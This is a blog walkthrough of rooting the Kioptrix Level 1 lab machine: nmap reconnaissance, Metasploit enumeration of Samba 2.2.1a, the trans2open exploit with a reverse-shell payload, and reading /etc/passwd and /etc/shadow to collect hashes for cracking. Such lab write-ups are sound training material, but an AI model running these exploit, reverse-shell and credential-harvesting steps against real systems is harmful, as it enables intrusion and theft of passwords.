+++
title = 'Kioptrix Level 1 Walkthrough'
date = 2022-10-20T03:21:26-04:00
summary = 'Kioptrix is usually the starting point of all penetration testers, the first box we pawn. Here is a walkthrough of how I rooted my kioptrix box.'
+++

# PAWN KIOPTRIX LEVEL 1

> Tools: Nmap, SearchSploit, MetaSploit, Google
![](/images/kioptrix/kioptrix.webp)

You can download kioptrix from [vulnhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/). I will not cover setting up Kioptrix on a virtualbox but it is a simple process you can get tutorials or writes-ups.

Once you have kioptrix and your attacker machine(We will use Kali linux) ready, we are ready to hack the h*ll out of kioptrix.
We need to know the ip address of kioptrix. To do this, we will have to scan from our attacker machine. Check your ip adress of Kali by:
> ifconfig

![](/images/kioptrix/kioptrix1.webp)

On my case, my kali linux ip is 192.168.100.200

Now, we will scan all other machines running on the same network as kali linux by using nmap and -r for range of /24:

> nmap -r 192.168.100.200/24

![](/images/kioptrix/kioptrix2.webp)

Observe carefully and you will discover a machine running on oracle virtualbox. That is our kioptrix machine. Mine is running on 192.168.100.201

Now that we have our ip address, we will need to collect as much information as we can about the services running on it to discover if some may have vulnerabilities. We will conduct an inclusive recon using nmap and the -A option, -p- to scan all ports that are up and -T4 which is a time factor I consider most efficient:

> sudo nmap -A -p- -T4 192.168.100.201

![](/images/kioptrix/kioptrix3.webp)

Interesting, right???
We observe tcp running on 22, http on port 80, smbd on port 139, and many more services. Usually, I love to check what the http looks like so I navigated to http://192.168.100.201:80

![](/images/kioptrix/kioptrix4.webp)

We notice it is running apache. It provides more information that it is running on red hat linux. You can navigate to a non-existing page here like /whoareyou. Of course, it gives you an error that page not found, but will tell you what apache it is running on and you can research on vulnerabilities for such. Mine as observed from both the scan and http page, is running apache 1.3.20

![](/images/kioptrix/kioptrix5.webp)

My interest though was on the service running on port 139, the samba smbd. I researched about it and discovered it is a server daemon that provides filesharing and printing services to clients.
Not much information was provided about it from the scan. I needed to know what version it was running and find out if it could have some vulnerabilities.
I found out that I could use metasploit to enumerate the service. Niceee!!!
Fire up metasploit from the terminal by:

> msfconsole

We can search the module to enumerate by:

> search smb_version

We’ll get a module auxiliary/scanner/smb/smb_version. We can use it by:

> use auxiliary/scanner/smb/smb_version

Or by simply

> use 0

We type options and set the rhosts to the ip of kioptrix by:

> set rhosts 192.168.100.201

Now hit the command run or exploit

![](/images/kioptrix/kioptrix6.webp)

We discover that kioptrix is running version 2.2.1a.\
From numerous research, I found out that Samba 2.2 is vulnerable. We can use a certain tool, searchsploit to find some of the vulnerabilities by the command:

> searchsploit samba 2.2

![](/images/kioptrix/kioptrix7.webp)

We notice the word trans2open in almost every exploit. Must be something interesting about it right? Let’s find out\
In metasploit, do:

> search trans2open

![](/images/kioptrix/kioptrix8.webp)

Different modules are displayed. Though, through our enumeration, we are aware we are running linux so we use 1.
Check options and set rhosts to your kioptrix ip address.
Now hit exploit.

We notice that it runs with no success. This is because we have not set a the correct payload. Hit ctrl+c

By some research, we discover a great payload for getting a reverse shell(of course this is our goal). Use:

> search x86/shell_reverse_tcp

![](/images/kioptrix/kioptrix9.webp)

We get some few options to use. I always love a staged payload for some reasons, hence I tried some of these and settled on the third.\
I then set it by the following command:

> set payload payload/bsdi/x86/shell_reverse_tcp

Now I hit exploit:

![](/images/kioptrix/kioptrix10.webp)

A reverse shell gets generated!!\
Running whoami on the shell, it confirms we are root user hence we can do all kinds of stuff here.\
I love checking users on the machine by checking the /etc/passwd file:

> cat /etc/passwd

![](/images/kioptrix/kioptrix11.webp)

Though, this only has users. Passwords of these users are stored on /etc/shadow file

> cat /etc/shadow

![](/images/kioptrix/kioptrix12.webp)

You have the password hashes and what remains is to go crack these passwords using tools like hashcat. There are much more things you can do at this stage since you are already a root user(you own the box by now). Check the flag at */home/root* if it is a CTF

Fun, ain’t it :)